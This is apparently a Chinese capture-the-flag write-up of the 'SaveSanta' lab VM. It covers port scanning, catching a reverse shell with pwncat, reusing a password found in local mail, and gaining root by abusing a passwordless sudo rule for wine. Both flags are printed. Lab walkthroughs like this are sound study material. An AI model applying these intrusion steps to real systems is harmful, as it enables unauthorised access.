# SaveSanta

:::note

[Linux VM] [Tested on VirtualBox] created by || eMVee

⏲️ Release Date // 2024-02-29

✔️ MD5 // 1d2c1d367362a9b9fb985e7ccb05a94d

☠ Root // 0

💀 User // 0

📝Notes //
Enjoy.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.124
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.124
Host is up (0.00038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 3 disallowed entries
|_/ /administration/ /santa
|_http-title: The Naughty Elves
|_http-server-header: Apache
```

udp 并未发现服务

## web 服务

尝试进行目录爆破

```plaintext
[17:34:20] 301 -  240B  - /administration/Sym.php  ->  http://192.168.56.124/media.html
[17:34:20] 301 -  245B  - /administration  ->  http://192.168.56.124/administration/
[17:34:20] 301 -  240B  - /administration/  ->  http://192.168.56.124/media.html
[17:34:33] 200 - 1012B  - /index.html
[17:34:34] 301 -  241B  - /javascript  ->  http://192.168.56.124/javascript/
[17:34:49] 200 -   70B  - /robots.txt
```

### `/robots.txt`

```plaintext
User-agent: *
Disallow: /
Disallow: /administration/
Disallow: /santa
```

### `/administration`

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://192.168.56.124/media.html">here</a>.</p>
</body></html>
```

目测没用

### `/santa`

是一个登陆界面

![img](img/image_20240236-173648.png)

:::warning

靶机启动后，访问 `/santa` 这个路由之后，这个路由就失效了，同时首页也会发生变化

:::

## Trick or treat ?

在重启靶机后，再次扫描端口

```plaintext
Nmap scan report for 192.168.56.124
Host is up (0.00047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
80/tcp    open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Merry Christmas to everyone - Santa Claus
65415/tcp open  unknown
```

发现新开放了一个端口

尝试连接 65415 这个端口，得到

```shell
┌─[randark@parrot]─[~]
└──╼ $ nc 192.168.56.124 65415
GET /
ls
user.txt
a
ls
user.txt
```

## User - alabaster

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 8888
[18:00:50] Welcome to pwncat 🐈!
[18:00:54] received connection from 192.168.56.124:36016
[18:00:54] 192.168.56.124:36016: registered new host w/ db
(local) pwncat$ back
(remote) alabaster@santa:/home$ whoami
alabaster
```

### flag - user

```shell
(remote) alabaster@santa:/home/alabaster$ cat user.txt
                 ..'''::::...
              .::'`'''':::..
        '...::'               `.----.
                              /_.--._\
                            ,  |=   |
                          ,/ \,|  =-|
                        ,/ /`\ \,   |
                      ,/ /`___`\ \,-|
                    ,/ /'.-:";-.`\ \|
                  ,/ /` //_|_|_\\ `\ \, ,/\,
                ,/ /`   ||_|_|_||   `\;/ /\ \,
              ,/ /`     ||_|_|_||   ,/ /`/\`\ \,
            ,/ /`    ==_`-------' ,/ /` ~\/~ `\ \,
          ,/ /` __|     _       ,/ /`         =`\ \,
        ,/ /`==_     __|___-  ,/ /` ==-=|__|     `\ \,
      ,/ /`        --=      ,/ /`            __|-- `\ \,
    ,/ /`  |__ ..----.. = ,/ /`()    .-"""""-.     ()`\ \,
   / /`|     .'_.-;;-._'./ /; {__} .'.-"""""-.'.  {__} ;\ \
  |/`  |_| =/.; | || | ;|/` | |::|/.'_____'.\ |::| | `\|
       |   |/_|_|_||_|_|_\| |=\::/||  /|_|_|\  || \::/ |
       | -=|| | | || | | || |  || || |_|_|_|_| ||  |||_|
       | , ||-|-|-||-|-|-||=|  JL || |_|_|_|_| ||  JL  |
       |/_\||_|_|_||_|_|_||-|'    ||   .:::.   ||=_   _|
       /_ (|| | | || | | || |  ==_|| /:::::::\ || __P__|
       /_\ \|-|-|-||-|-|-|| |     || |::(`)::| ||/\ |  `\
      `>/ _\\_|_|_||_|_|_||-|-'|__|| \/`\+/`\/ ||||_____|
      /_/   <-------------' |     ||()\_/Y\_/  ||/  || |
     /  ` \_ ( ==_  __|-    |_|_  ||   / / \   || =_|| |
    `/_) | _ <`   __        |   = ||  /_/ \_\  ||   || |
     >  /     \ == _  ==_   | -   ||           ||=  || |
    /_/   ( \  `\ _| =__   =|-__|_||-----------||_| || |
   )-._/ _\ _,-('__.;-'-;__     `"""""""""""||`"-._
  '-,._   \__.-`-;''`          ``--'`""'"""`"""``-- `--'--. '
       ```             ``         `""""'""""'"`""".--------

                HMV{f3fda86e428ccda3e33d207217665201}
```

### 环境探测

发现存在邮件

```plaintext title="mail"
Return-Path: <santa@santa.hmv>
Received: from santa.hmv (localhost [127.0.0.1])
        by santa.hmv (8.17.1.9/8.17.1.9/Debian-2) with ESMTP id 41T9d2vU001016
        for <alabaster@santa.hmv>; Thu, 29 Feb 2024 09:39:02 GMT
Received: (from santa@localhost)
        by santa.hmv (8.17.1.9/8.17.1.9/Submit) id 41T9d2Ms001015;
        Thu, 29 Feb 2024 09:39:02 GMT
From: Santa Claus <santa@santa.hmv>
Message-Id: <202402290939.41T9d2Ms001015@santa.hmv>
Subject: Important update about the hack
To: <alabaster@santa.hmv>
User-Agent: mail (GNU Mailutils 3.15)
Date: Thu, 29 Feb 2024 09:39:02 +0000

Dear Alabaster,

As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible.

I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates.

His account has been created and ready to logon. When Bill arrives, tell him his username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' He will know what to do next.

Please help Bill as much as possible so Christmas can go on!

- Santa
```

得到凭据

```plaintext
bill:JingleBellsPhishingSmellsHackersGoAway
```

## User - bill

```shell
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs bill@192.168.56.124
[18:57:52] Welcome to pwncat 🐈!
Password: **************************************
[18:57:59] 192.168.56.124:22: upgrading from /usr/bin/dash to /usr/bin/bash
[18:58:00] 192.168.56.124:22: registered new host w/ db
(local) pwncat$ back
(remote) bill@santa:/home/bill$ whoami
bill
```

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for bill on santa:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bill may run the following commands on santa:
    (ALL) NOPASSWD: /usr/bin/wine
```

## User - root

```shell
$ sudo /usr/bin/wine cmd
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32:i386"
X11 connection rejected because of wrong authentication.
0050:err:winediag:nodrv_CreateWindow Application tried to create a window, but no driver could be loaded.
0050:err:winediag:nodrv_CreateWindow L"The explorer process failed to start."
0050:err:systray:initialize_systray Could not create tray window
Microsoft Windows 6.1.7601

Z:\home\bill>whoami
0120:err:winediag:ntlm_check_version ntlm_auth was not found. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution.
0120:err:ntlm:ntlm_LsaApInitializePackage no NTLM support, expect problems
SANTA\root
```

### flag - root

```shell
Z:\root>type root.txt
                               ..,,,,,,,,,,,,,,,,..
                        ..,,;;;;;;;;;;;;;;;;;;;;;;;;;;,,.
                    .,::::;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaa;;,,.
                .,;;,:::a@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a,
              ,;;;;.,a@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a
           ,;;;;%;.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a,
        ,;%;;;;%%;,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
     ,;;%%;;;;;%%;;@@@@@@@@@@@@@@'%v%v%v%v%v%v%v%v%v%v%v%v`@@@@@@@@@
   ,;;%%;;;;:;;;%;;@@@@@@@@@'%vvvvvvvvvnnnnnnnnnnnnnnnnvvvvvv%`@@@@'
  ,;%%;;;;;:;;;;;;;;@@@@@'%vvva@@@@@@@@avvnnnnnnnnnnvva@@@@@@@OOov,
 ,;%;;;;;;:::;;;;;;;@@'OO%vva@@@@@@@@@@@@vvnnnnnnnnvv@@@@@@@@@@@Oov
 ;%;;;;;;;:::;;;;;;;;'oO%vvn@@%nvvvvvvvv%nnnnnnnnnnnnn%vvvvvvnn%@Ov
 ;;;;;;;;;:::;;;;;;::;oO%vvnnnn>>nn.   `nnnnnnnnnnnn>>nn.   `nnnvv'
 ;;;;;;;;;:::;;;;;;::;oO%vvnnvvmmmmmmmmmmvvvnnnnnn;%mmmmmmmmmmmmvv,
 ;;;;;;;;;:::;;;;;;::;oO%vvmmmmmmmmmmmmmmmmmvvnnnv;%mmmmmmmmmmmmmmmv,
 ;;;;;;;;;;:;;;;;;::;;oO%vmmmmnnnnnnnnnnnnmmvvnnnvmm;%vvnnnnnnnnnmmmv
  `;%;;;;;;;:;;;;::;;o@@%vvmmnnnnnnnnnnnvnnnnnnnnnnmmm;%vvvnnnnnnmmmv
   `;;%%;;;;;:;;;::;.oO@@%vmmnnnnnnnnnvv%;nnnnnnnnnmmm;%vvvnnnnnnmmv'
     `;;;%%;;;:;;;::;.o@@%vvnnnnnnnnnnnvv%;nnnnnnnmm;%vvvnnnnnnnv%'@a.
      a`;;;%%;;:;;;::;.o@@%vvvvvvvvvvvvvaa@@@@@@@@@@@@aa%%vvvvv%%@@@@o.
     .@@o`;;;%;;;;;;::;,o@@@%vvvvvvva@@@@@@@@@@@@@@@@@@@@@avvvva@@@@@%O,
    .@@@@@Oo`;;;;;;;;::;o@@@@@@@@@@@@@@@@@@@@"""""""@@@@@@@@@@@@@@@@@OO@a
  .@@@@@@@@@OOo`;;;;;;:;o@@@@@@@@@@@@@@@@" "@@@@@@@@@@@@@@oOO@@@,
 .@@@@o@@@@@@@OOo`;;;;:;o,@@@@@@@@@@%vvvvvvvvvvvvvvvvvv%%@@@@@@@@@oOOO@@@@@,
 @@@@o@@@@@@@@@OOo;::;'oOOooooooooOOOo%vvvvvvvvvvvvvv%oOOooooooooOOO@@@O@@@,
 @@@oO@@@@@@@@@OOa@@@@@a,oOOOOOOOOOOOOOOoooooooooooooOOOOOOOOOOOOOO@@@@Oo@@@
 @@@oO@@@@@@@OOa@@@@@@@@Oo,oO@@@@@@@@@@OOOOOOOOOOOOOO@@@@@@@@@@@@@@@@@@Oo@@@
 @@@oO@@@@@@OO@@@@@@@@@@@OO,oO@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@
 @@@@o@@@@@@OO@@@@@@@@@@OOO,oO@@@@@@@@@O@@@@@@@@@@@@@@@@@@@@@o@@@@@@@@@O@@@@
 @@@@@o@@@@@OOo@@@@@@@OOOO'oOO@@@@@@@@Oo@@@@@@@@@@@@O@@@@@@@@Oo@@@@@@@@@@@@a
`@@@@@@@O@@@OOOo`OOOOOOO'oOO@@@@@@@@@O@@@@@@@@@@@@@@@O@@@@@@@@Oo@@@@@@@@@@@@
 `@@@@@OO@@@@@OOOooooooooOO@@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@Oo@@@@@@oO@@@@
   `@@@OO@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@O@@@@@@@oO@@@'
      `@@`O@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@@@@@@@@O@@@'
        `@ @@@@@@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@'@@'
           `@@@@@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@ a'
               `@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@'
                  `@@@@@@@@@@@Oo@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@'
                      `@@@@@@Oo@@@@O@@@@@@@@@@@@@@@@@@@'o@@'
                          `@@@@@@@@oO@@@@@@@@@@@@@@@@@ a'
                              `@@@@@oO@@@@@@@@@@@@@@' '
                                '@@@o'`@@@@@@@@'
                                 @'.@@@@'
                                     @@'
                                   @'

                HMV{67df9276f8aaa3f9f50b3e41fe5cbc53}
```

## 后记

如果对这台靶机的具体实现细节感兴趣的话，可以访问 `\home\pepper\scripts` 这个路由，查看作者为这台靶机所设计的一系列自动脚本
